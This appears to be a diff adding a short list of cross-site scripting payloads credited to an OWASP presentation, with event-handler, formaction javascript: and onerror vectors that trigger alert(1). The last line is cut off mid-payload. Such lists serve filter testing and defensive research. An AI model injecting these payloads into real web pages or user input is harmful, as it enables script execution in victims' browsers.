@@ -1,0 +1,7 @@
+# Mauro Gentile
+# https://www.owasp.org/images/7/7c/Gentile_OWASP_EU_Tour_2013.pdf
+<input onfocus=write(1) autofocus>
+<form id="test" /><button form="test" formaction="javascript:alert(1)">X</button>
+<video><source onerror="alert(1)">
+<form><button><button form="test" formaction="javascript:alert(1)">X</button>
+<script/src=data
